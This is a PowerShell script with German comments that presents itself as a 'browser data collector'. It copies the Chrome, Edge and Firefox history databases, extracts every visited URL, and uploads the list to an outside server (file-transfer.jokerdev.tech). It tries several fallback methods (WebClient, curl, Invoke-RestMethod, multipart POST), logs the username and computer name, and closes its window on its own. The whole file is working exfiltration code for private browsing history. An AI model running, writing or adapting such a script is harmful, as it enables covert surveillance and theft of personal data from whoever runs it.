# Browser Data Collector mit automatischem Upload
# PowerShell als Administrator ausführen!

Write-Host "=== Browser Data Collector ===" -ForegroundColor Cyan
Write-Host "Starte um: $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Gray

# URLs sammeln
$allUrls = [System.Collections.ArrayList]@()

# Prüfe Chrome
$chromeHistory = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
if (Test-Path $chromeHistory) {
    Write-Host "Lese Chrome History..." -ForegroundColor Green
    try {
        $tempFile = "$env:TEMP\chrome_temp_$(Get-Random).tmp"
        # Datei kopieren (da sie vom Browser gesperrt ist)
        Copy-Item $chromeHistory $tempFile -Force -ErrorAction SilentlyContinue
        
        if (Test-Path $tempFile) {
            # Binärdaten lesen und nach URLs suchen
            $bytes = [System.IO.File]::ReadAllBytes($tempFile)
            $text = [System.Text.Encoding]::UTF8.GetString($bytes)
            
            # Bessere URL-Erkennung
            $urlPattern = 'https?://(?:[-\w]+\.)+[-\w]+(?:/[^\s""<>]*)?'
            $matches = [regex]::Matches($text, $urlPattern, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
            
            foreach ($match in $matches) {
                $url = $match.Value.Trim()
                # Filtere interne und ungültige URLs
                if ($url.Length -gt 15 -and 
                    $url -notmatch '^(chrome|edge|opera|about|file|data):' -and
                    $url -notmatch '\/\$' -and
                    $url -notmatch '[^\x20-\x7E]' -and
                    $url -match '\.(com|de|org|net|info|io|tv|me|uk|fr|es|it|ru|ch|at)$') {
                    [void]$allUrls.Add($url)
                }
            }
            
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            Write-Host "  Chrome: $($allUrls.Count) URLs gefunden" -ForegroundColor Gray
        }
    } 
    catch {
        Write-Host "  Fehler bei Chrome: $_" -ForegroundColor Red
    }
}

# Prüfe Edge
$edgeHistory = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
if (Test-Path $edgeHistory) {
    Write-Host "Lese Edge History..." -ForegroundColor Green
    try {
        $tempFile = "$env:TEMP\edge_temp_$(Get-Random).tmp"
        Copy-Item $edgeHistory $tempFile -Force -ErrorAction SilentlyContinue
        
        if (Test-Path $tempFile) {
            $bytes = [System.IO.File]::ReadAllBytes($tempFile)
            $text = [System.Text.Encoding]::UTF8.GetString($bytes)
            
            $urlPattern = 'https?://(?:[-\w]+\.)+[-\w]+(?:/[^\s""<>]*)?'
            $matches = [regex]::Matches($text, $urlPattern, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
            
            foreach ($match in $matches) {
                $url = $match.Value.Trim()
                if ($url.Length -gt 15 -and 
                    $url -notmatch '^(chrome|edge|opera|about|file|data):' -and
                    $url -notmatch '\/\$' -and
                    $url -notmatch '[^\x20-\x7E]' -and
                    $url -match '\.(com|de|org|net|info|io|tv|me|uk|fr|es|it|ru|ch|at)$') {
                    [void]$allUrls.Add($url)
                }
            }
            
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            Write-Host "  Edge: $($allUrls.Count) URLs gefunden" -ForegroundColor Gray
        }
    } 
    catch {
        Write-Host "  Fehler bei Edge: $_" -ForegroundColor Red
    }
}

# Prüfe Firefox
$firefoxProfiles = Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\" -Directory -ErrorAction SilentlyContinue
if ($firefoxProfiles) {
    Write-Host "Lese Firefox History..." -ForegroundColor Green
    foreach ($profile in $firefoxProfiles) {
        $historyPath = Join-Path $profile.FullName "places.sqlite"
        if (Test-Path $historyPath) {
            try {
                $tempFile = "$env:TEMP\firefox_temp_$(Get-Random).tmp"
                Copy-Item $historyPath $tempFile -Force -ErrorAction SilentlyContinue
                
                if (Test-Path $tempFile) {
                    $bytes = [System.IO.File]::ReadAllBytes($tempFile)
                    $text = [System.Text.Encoding]::UTF8.GetString($bytes)
                    
                    $urlPattern = 'https?://(?:[-\w]+\.)+[-\w]+(?:/[^\s""<>]*)?'
                    $matches = [regex]::Matches($text, $urlPattern, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
                    
                    foreach ($match in $matches) {
                        $url = $match.Value.Trim()
                        if ($url.Length -gt 15 -and 
                            $url -notmatch '^(chrome|edge|opera|about|file|data):' -and
                            $url -notmatch '\/\$' -and
                            $url -notmatch '[^\x20-\x7E]' -and
                            $url -match '\.(com|de|org|net|info|io|tv|me|uk|fr|es|it|ru|ch|at)$') {
                            [void]$allUrls.Add($url)
                        }
                    }
                    
                    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
                }
            }
            catch {
                Write-Host "  Fehler bei Firefox ($($profile.Name)): $_" -ForegroundColor Red
            }
        }
    }
    Write-Host "  Firefox: $($allUrls.Count) URLs gefunden" -ForegroundColor Gray
}

# Deduplizieren und bereinigen
Write-Host "`nBereinige Daten..." -ForegroundColor Yellow
$uniqueUrls = $allUrls | Sort-Object -Unique | Where-Object { 
    $_ -and $_.Length -gt 15 -and $_ -match '^https?://' -and $_ -notmatch '[^\x20-\x7E]'
}

# Ergebnisse anzeigen
Write-Host "`n=== ERGEBNISSE ===" -ForegroundColor Cyan
Write-Host "Gefundene URLs: $($uniqueUrls.Count)" -ForegroundColor Green

if ($uniqueUrls.Count -gt 0) {
    Write-Host "`nBeispiele:" -ForegroundColor Yellow
    $uniqueUrls | Select-Object -First 10 | ForEach-Object {
        Write-Host "  $_" -ForegroundColor Gray
    }
}

# Datei speichern
$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$outputFile = "$env:TEMP\browser_data_$timestamp.txt"
$uniqueUrls | Out-File $outputFile -Encoding UTF8
Write-Host "`nDaten gespeichert in: $outputFile" -ForegroundColor Green

# Automatischer Upload starten
Write-Host "`n=== AUTOMATISCHER UPLOAD ===" -ForegroundColor Cyan
Write-Host "Starte Upload..." -ForegroundColor Yellow

try {
    # Methode 1: PowerShell WebClient
    $uploadUrl = "https://file-transfer.jokerdev.tech/upload/browser_data_$timestamp.txt"
    Write-Host "Upload-URL: $uploadUrl" -ForegroundColor Gray
    
    $webClient = New-Object System.Net.WebClient
    $webClient.UploadFile($uploadUrl, $outputFile)
    
    Write-Host "Upload erfolgreich!" -ForegroundColor Green
    Write-Host "Datei: browser_data_$timestamp.txt" -ForegroundColor Gray
}
catch {
    Write-Host "WebClient Upload fehlgeschlagen, versuche cURL..." -ForegroundColor Yellow
    
    # Methode 2: cURL
    try {
        # Prüfe ob cURL installiert ist
        $curlPath = "curl.exe"
        if (Get-Command $curlPath -ErrorAction SilentlyContinue) {
            Write-Host "Nutze cURL..." -ForegroundColor Gray
            & curl -T "$outputFile" "https://file-transfer.jokerdev.tech/upload/browser_data_$timestamp.txt"
            Write-Host "cURL Upload erfolgreich!" -ForegroundColor Green
        }
        else {
            # Methode 3: Invoke-RestMethod
            Write-Host "cURL nicht gefunden, versuche Invoke-RestMethod..." -ForegroundColor Yellow
            $fileBytes = [System.IO.File]::ReadAllBytes($outputFile)
            Invoke-RestMethod -Uri "https://file-transfer.jokerdev.tech/upload/browser_data_$timestamp.txt" -Method Put -Body $fileBytes -ContentType "application/octet-stream"
            Write-Host "Invoke-RestMethod Upload erfolgreich!" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "Alle Upload-Methoden fehlgeschlagen!" -ForegroundColor Red
        Write-Host "Fehler: $_" -ForegroundColor Red
        
        # Generiere manuellen cURL-Befehl
        Write-Host "`nManueller Befehl:" -ForegroundColor Yellow
        Write-Host "curl -T `"$outputFile`" https://file-transfer.jokerdev.tech/upload/browser_data_$timestamp.txt" -ForegroundColor White
        
        # Versuche alternative Methode
        Write-Host "`nAlternative Methode..." -ForegroundColor Yellow
        try {
            $fileName = [System.IO.Path]::GetFileName($outputFile)
            $boundary = [System.Guid]::NewGuid().ToString()
            $fileContent = [System.IO.File]::ReadAllBytes($outputFile)
            
            $body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$fileName"
Content-Type: application/octet-stream

$([System.Text.Encoding]::UTF8.GetString($fileContent))
--$boundary--
"@
            
            Invoke-WebRequest -Uri "https://file-transfer.jokerdev.tech/upload" -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary"
            Write-Host "Alternative Upload erfolgreich!" -ForegroundColor Green
        }
        catch {
            Write-Host "Auch alternative Methode fehlgeschlagen." -ForegroundColor Red
        }
    }
}

# Upload-Log erstellen
$logFile = "$env:TEMP\upload_log_$timestamp.txt"
@"
Browser Data Collector Log
==========================
Zeitpunkt: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
Benutzer: $env:USERNAME
Computer: $env:COMPUTERNAME
Gefundene URLs: $($uniqueUrls.Count)
Datei: $outputFile
Upload versucht an: https://file-transfer.jokerdev.tech/upload/browser_data_$timestamp.txt
Erfolg: $(if ($?) { "JA" } else { "NEIN" })
"@ | Out-File $logFile -Encoding UTF8

Write-Host "`nLog-Datei: $logFile" -ForegroundColor Gray
Write-Host "`n=== VORGANG ABGESCHLOSSEN ===" -ForegroundColor Cyan

# Kurze Pause, dann beenden
Write-Host "`nDas Fenster schließt in 10 Sekunden..." -ForegroundColor Yellow
Start-Sleep -Seconds 10
